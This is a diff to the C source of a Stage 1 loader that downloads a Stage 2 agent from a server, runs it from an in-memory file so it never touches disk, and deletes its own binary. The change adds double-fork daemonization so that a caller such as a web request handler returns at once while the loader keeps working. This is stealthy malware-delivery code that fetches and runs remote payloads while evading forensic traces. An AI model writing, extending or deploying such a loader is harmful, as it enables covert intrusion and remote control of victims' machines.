@@ -20,7 +20,9 @@
   *
   * Usage: loader <server-url> <token> <agent-id>
   *
-  * Downloads Stage 2 agent from <server-url>/dl/second-stage/linux-ARCH,
+  * Daemonizes immediately (double-fork + setsid) so the parent process
+  * (e.g. a web request handler) returns right away.  The daemon child
+  * downloads Stage 2 agent from <server-url>/dl/second-stage/linux-ARCH,
   * loads it into an anonymous in-memory file (memfd_create + MFD_CLOEXEC),
   * and exec(2)s from /proc/self/fd/N — Stage 2 never touches disk.
   * Self-deletes (unlink argv[0]) immediately on startup (one-shot).
@@ -36,6 +38,7 @@
 #include <mbedtls/x509_crt.h>
 
 #include <errno.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -107,6 +110,28 @@ int main(int argc, char* argv[]) {
     const char* server_url = argv[1];
     const char* token = argv[2];
     const char* agent_id = argv[3];
+
+    /* ---- Daemonize (double-fork + setsid) ----
+     * The parent returns immediately so a short-lived caller (e.g. a web
+     * request handler) is released.  The daemon grandchild does the real
+     * work: download Stage 2, memfd, exec.
+     */
+    {
+        pid_t pid = fork();
+        if (pid < 0) _exit(1);
+        if (pid > 0) _exit(0);          /* parent exits */
+        setsid();                        /* new session, no ctty */
+        pid = fork();
+        if (pid < 0) _exit(1);
+        if (pid > 0) _exit(0);          /* session leader exits */
+        int fd = open("/dev/null", O_RDWR);
+        if (fd >= 0) {
+            dup2(fd, STDIN_FILENO);
+            dup2(fd, STDOUT_FILENO);
+            dup2(fd, STDERR_FILENO);
+            if (fd > STDERR_FILENO) close(fd);
+        }
+    }
 
     /* ---- Build download URL ---- */
     char dl_url[2048];
